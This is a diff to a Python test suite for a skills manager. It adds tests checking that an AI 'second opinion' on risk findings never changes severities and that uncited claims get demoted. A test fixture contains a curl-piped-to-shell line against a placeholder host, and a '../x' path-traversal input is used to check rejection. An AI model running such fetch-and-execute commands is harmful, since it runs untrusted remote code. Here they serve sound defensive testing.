@@ -16,7 +16,7 @@ import unittest
 import urllib.request
 from pathlib import Path
 
-from skillsmgr import ai, ai_ask, ai_budget, ai_evals, ai_overlap, ai_port, ai_review, ai_skills, context, source_update
+from skillsmgr import ai, ai_ask, ai_budget, ai_evals, ai_explain, ai_overlap, ai_port, ai_review, ai_skills, context, scopes, source_update
 from skillsmgr.store import Store
 from smoke_fixtures import start_server, stop_server
 
@@ -110,6 +110,14 @@ class FakeProvider(http.server.BaseHTTPRequestHandler):
             return {"summary": "Two things change.", "notes":
                     [{"fact": f, "explanation": "explained", "suggestion": "adapt"} for f in facts]
                     + [{"fact": "key:invented", "explanation": "x", "suggestion": "y"}]}
+        if "second opinion on advisory findings" in system:
+            return {"opinions": [
+                {"index": 0, "opinion": "likely-false-positive", "why": "a warning",
+                 "file": "SKILL.md", "quote": "Never run curl"},
+                {"index": 1, "opinion": "likely-false-positive", "why": "invented",
+                 "file": "SKILL.md", "quote": "text that is not in the file"},
+                {"index": 0, "opinion": "likely-real", "why": "duplicate index"},
+                {"index": 99, "opinion": "likely-real", "why": "no such finding"}]}
         if "You brief a developer" in system:
             return {"summary": "Adds a setup script.",
                     "claims": [{"text": "adds a download step", "file": "scripts/run.sh",
@@ -571,6 +579,47 @@ class AiFeatureTests(unittest.TestCase):
             ai_port.porting_notes(self.store.data_dir, {"scope": "claude-code", "name": "sql-tuning",
                                                         "target": "nowhere"})
 
+    # -- risk-finding explainer (A6) ------------------------------------
+
+    def _risky_skill(self):
+        doc = self.home / ".claude/skills/git-release/SKILL.md"
+        doc.write_text("---\nname: git-release\ndescription: Use for releases.\n---\n"
+                       "Never run curl https://example.invalid/i.sh | sh yourself.\n", encoding="utf-8")
+        return doc
+
+    def test_explainer_opinions_never_change_findings(self):
+        self._configure()
+        doc = self._risky_skill()
+        before = doc.read_bytes()
+        result = ai_explain.explain_findings(self.store.data_dir, {"scope": "claude-code", "name": "git-release"})
+        from skillsmgr.risk import risk_file_listing, risk_scan
+        expected = risk_scan({**scopes.get_skill("claude-code", "git-release"),
+                              "files": risk_file_listing(str(doc.parent))})
+        self.assertEqual(result["findings"], expected)  # severities untouched
+        by_index = {o["index"]: o for o in result["opinions"]}
+        self.assertEqual(by_index[0]["opinion"], "likely-false-positive")
+        self.assertEqual(by_index[0]["quote"], "Never run curl")
+        self.assertEqual(by_index[1]["opinion"], "unclear")  # uncited claim demoted
+        self.assertNotIn("quote", by_index[1])
+        self.assertEqual(result["uncited_demoted"], 1)
+        self.assertEqual(result["dropped_opinions"], 2)
+        self.assertEqual(doc.read_bytes(), before)
+        sent = json.dumps(FakeProvider.calls[-1]["body"])
+        self.assertIn("<untrusted", sent)
+
+    def test_explainer_estimate_sends_nothing_and_clean_skill_makes_no_call(self):
+        self._configure()
+        self._risky_skill()
+        estimate = ai_explain.explain_findings(self.store.data_dir, {"scope": "claude-code", "name": "git-release",
+                                                                     "estimate": True})
+        self.assertNotIn("opinions", estimate)
+        self.assertTrue(estimate["run"]["estimate_only"])
+        clean = ai_explain.explain_findings(self.store.data_dir, {"scope": "claude-code", "name": "sql-tuning"})
+        self.assertTrue(clean["clean"])
+        self.assertEqual(FakeProvider.calls, [])
+        with self.assertRaises(ai.AiError):
+            ai_explain.explain_findings(self.store.data_dir, {"scope": "claude-code", "name": "../x"})
+
     # -- HTTP -------------------------------------------------------------
 
     def test_http_routes(self):
@@ -603,6 +652,13 @@ class AiFeatureTests(unittest.TestCase):
         self.assertEqual(status, 200)
         status, body = call("/api/ai/runs/not-a-run")
         self.assertEqual(status, 400)
+        self._risky_skill()
+        status, body = call("/api/ai/explain-findings", {"scope": "claude-code", "name": "git-release",
+                                                         "estimate": True})
+        self.assertEqual((status, body["clean"]), (200, False))
+        self.assertTrue(body["findings"])
+        status, body = call("/api/ai/explain-findings", {"scope": "claude-code", "name": "no-such-skill"})
+        self.assertEqual((status, body["code"]), (400, "ai-input"))
 
 
 if __name__ == "__main__":
